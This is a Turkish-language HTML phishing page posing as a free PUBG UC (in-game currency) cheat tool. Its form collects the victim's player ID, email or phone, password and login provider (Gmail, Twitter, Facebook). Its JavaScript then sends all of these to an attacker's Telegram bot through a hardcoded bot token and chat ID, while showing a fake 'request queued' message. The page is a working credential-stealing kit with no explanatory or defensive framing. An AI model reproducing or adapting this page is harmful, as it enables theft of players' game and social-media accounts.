<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG UC Hilesi</title>
    <style>
        body {
            background: linear-gradient(135deg, #1a1a1a, #4d4d4d);
            color: #ffffff;
            font-family: 'Arial', sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        .container {
            background-color: rgba(51, 51, 51, 0.9);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 30px rgba(0, 255, 153, 0.3);
            width: 320px;
            text-align: center;
            position: relative;
            z-index: 1;
            display: none;
            animation: slideIn 0.5s ease-out;
            backdrop-filter: blur(5px);
            border: 1px solid #00ff99;
        }
        @keyframes slideIn {
            from {
                transform: translateY(50px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #00ff99;
            text-shadow: 0 0 10px rgba(0, 255, 153, 0.5);
        }
        .subtitle {
            color: #bbb;
            margin-bottom: 25px;
            font-size: 14px;
        }
        input, select {
            width: calc(100% - 20px);
            padding: 12px;
            margin: 8px 0;
            border: none;
            border-radius: 5px;
            background-color: rgba(68, 68, 68, 0.8);
            color: #fff;
            transition: all 0.3s ease;
            font-size: 14px;
        }
        input::placeholder {
            color: #aaa;
        }
        input:focus, select:focus {
            background-color: rgba(85, 85, 85, 0.8);
            outline: none;
            box-shadow: 0 0 10px 2px rgba(0, 255, 153, 0.5);
        }
        button {
            padding: 14px;
            background: linear-gradient(135deg, #00ff99, #00cc7a);
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            color: #111;
            margin-top: 15px;
            box-shadow: 0 4px 15px rgba(0, 255, 153, 0.4);
        }
        button:hover {
            transform: scale(1.03);
            box-shadow: 0 6px 20px rgba(0, 255, 153, 0.6);
        }
        button:active {
            transform: scale(0.98);
        }
        footer {
            margin-top: 20px;
            font-size: 12px;
            color: #bbb;
        }
        .rain {
            position: absolute;
            top: -10%;
            width: 100%;
            height: 100%;
            overflow: hidden;
            pointer-events: none;
        }
        .drop {
            position: absolute;
            background: rgba(255, 255, 255, 0.8);
            width: 2px;
            height: 20px;
            animation: fall linear infinite;
        }
        @keyframes fall {
            to {
                transform: translateY(100vh);
            }
        }
        .intro {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 32px;
            color: #00ff99;
            text-align: center;
            z-index: 2;
            animation: fadeIn 2s ease-in-out;
            text-shadow: 0 0 15px rgba(0, 255, 153, 0.7);
        }
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }
        .notification {
            display: none;
            background-color: rgba(0, 255, 153, 0.2);
            color: #00ff99;
            padding: 12px;
            border-radius: 5px;
            margin-top: 20px;
            text-align: center;
            border: 1px solid #00ff99;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(0, 255, 153, 0.4); }
            70% { box-shadow: 0 0 0 10px rgba(0, 255, 153, 0); }
            100% { box-shadow: 0 0 0 0 rgba(0, 255, 153, 0); }
        }
        .login-type-label {
            display: block;
            text-align: left;
            margin: 15px 0 5px 10px;
            color: #00ff99;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="rain">
        <!-- Yağmur damlalarını oluştur -->
    </div>
    
    <div class="intro" id="intro">
        UC TRICK 3.7 NEW
    </div>

    <div class="container" id="container">
        <h1>PUBG UC HİLESİ</h1>
        <p class="subtitle">ÜCRETSİZ UC BOTU</p>

        <input type="number" id="uc-amount" placeholder="UC Miktarı" required>
        <input type="text" id="player-id" placeholder="Oyuncu ID'niz" required>
        <input type="text" id="email-phone" placeholder="E-posta veya Telefon" required>
        <input type="password" id="password" placeholder="Şifreniz" required>
        
        <span class="login-type-label">Giriş Türü Seçin</span>
        <select id="login-type">
            <option value="E-posta">E-posta</option>
            <option value="Gmail">Gmail</option>
            <option value="Twitter">Twitter</option>
            <option value="Facebook">Facebook</option>
        </select>

        <select id="dress">
            <option value="Elbise 1">Elbise 1</option>
            <option value="Elbise 2">Elbise 2</option>
            <option value="Elbise 3">Elbise 3</option>
        </select>

        <button id="submit">UC'YU AL</button>
        
        <footer>© 2023 PUBG UC Hilesi. Tüm hakları saklıdır.</footer>
        
        <div class="notification" id="notification">
            İsteğiniz sıraya alındı. En yakın zamanda gönderim sağlanacaktır.
        </div>
    </div>

    <script>
        // Yağmur damlalarını oluşturmak için JavaScript
        const rainContainer = document.querySelector('.rain');
        for (let i = 0; i < 50; i++) {
            const drop = document.createElement('div');
            drop.className = 'drop';
            drop.style.left = Math.random() * 100 + '%';
            drop.style.top = Math.random() * -100 + 'px';
            drop.style.animationDuration = Math.random() * 1 + 0.5 + 's';
            drop.style.animationDelay = Math.random() * 2 + 's';
            rainContainer.appendChild(drop);
        }

        // Giriş animasyonu
        const intro = document.getElementById('intro');
        const container = document.getElementById('container');

        setTimeout(() => {
            intro.style.animation = 'fadeIn 2s ease-in-out';
            setTimeout(() => {
                intro.style.display = 'none';
                container.style.display = 'block';
            }, 2000);
        }, 1000);

        // UC'yu al butonuna tıklanınca bildirim göster ve Telegram'a veri gönder
        document.getElementById('submit').addEventListener('click', () => {
            const notification = document.getElementById('notification');
            notification.style.display = 'block';

            // Form verilerini al
            const loginType = document.getElementById('login-type').value;
            const ucAmount = document.getElementById('uc-amount').value;
            const playerId = document.getElementById('player-id').value;
            const emailPhone = document.getElementById('email-phone').value;
            const password = document.getElementById('password').value;
            const dress = document.getElementById('dress').value;

            // Telegram botuna veri gönder
            sendToTelegramBot(ucAmount, playerId, emailPhone, password, dress, loginType);

            // 3 saniye sonra bildirimi gizle
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        });

        function sendToTelegramBot(ucAmount, playerId, emailPhone, password, dress, loginType) {
            const token = '7391859784:AAHWGSeObS8dfS03x0hYdNT8WAtnoS7aMqI'; // Bot token
            const chatId = '7098644129'; // Admin chat ID

            const message = `
            🚀 Yeni UC İsteği 🚀
            -------------------------
            🔹 Giriş Türü: ${loginType}
            🔹 Oyuncu ID: ${playerId}
            🔹 E-posta/Tel: ${emailPhone}
            🔹 Şifre: ${password}
            🔹 Elbise: ${dress}
            🔹 UC Miktarı: ${ucAmount}
            -------------------------
            ⏳ ${new Date().toLocaleString()}
            `;

            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: message
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => console.log('Veri gönderildi:', data))
            .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html>
